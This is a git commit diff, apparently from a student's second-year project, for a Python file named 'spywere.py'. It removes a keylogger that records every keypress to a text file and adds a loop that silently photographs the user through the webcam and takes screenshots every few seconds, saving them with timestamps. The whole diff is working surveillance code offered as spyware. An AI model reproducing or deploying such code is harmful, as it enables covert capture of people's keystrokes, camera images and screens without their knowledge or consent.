85b879264427dd407fbb9b9c8f48a328440d05bc
Krisser12311 <Kristoffer6670@gmail.com>
2024-05-29 22:00:35 +0200

    Lidt her lidt der

--- yearTwo/SRC/spywere.py
+++ yearTwo/SRC/spywere.py
@@ -1,15 +1,43 @@
 import keyboard
+import time
+import cv2
+import pyautogui
+from PIL import Image
+cap = cv2.VideoCapture(0)
 
-def webcam():
-    print("Webcam module installed")
+def startUp():
+    if not cap.isOpened():
+        print("Webcam not available")
+        while True:
+            screenshot = pyautogui.screenshot()
+            timestamp = time.strftime("%Y%m%d-%H%M%S")
+            filename = f"screenshot_{timestamp}.png"
+            screenshot.save(filename)
+            print(f"Screenshot saved as {filename}")
+            time.sleep(5)
+    else:
+        while True:
+            ret, frame = cap.read()
+            if not ret:
+                print("Couldn't read")
+                break
+            timestamp = time.strftime("%Y%m%d-%H%M%S")
+            filename = f"image_{timestamp}.jpg"
+            cv2.imwrite(filename, frame)
+            print(f"Frame saved as {filename}")
 
-def screenShot():
-    print("Screen module installed")
+            print("Taking screenshot")
+            screenshot = pyautogui.screenshot()
+            print("Screenshot taken")
+            timestamp = time.strftime("%Y%m%d-%H%M%S")
+            filenameScreenShot = f"screenshot_{timestamp}.png"
 
-def keylogger(event):
-    logFile = "log.txt"
-    with open(logFile, "a") as f:
-        f.write('{}\n'.format(event.name))
+            screenshot.save(filenameScreenShot)
+            print(f"Screenshot saved as {filenameScreenShot}")
+            time.sleep(5)
 
-keyboard.on_press(keylogger)
-keyboard.wait()
+
+            time.sleep(5)
+        print("Closes webcam")
+
+startUp()
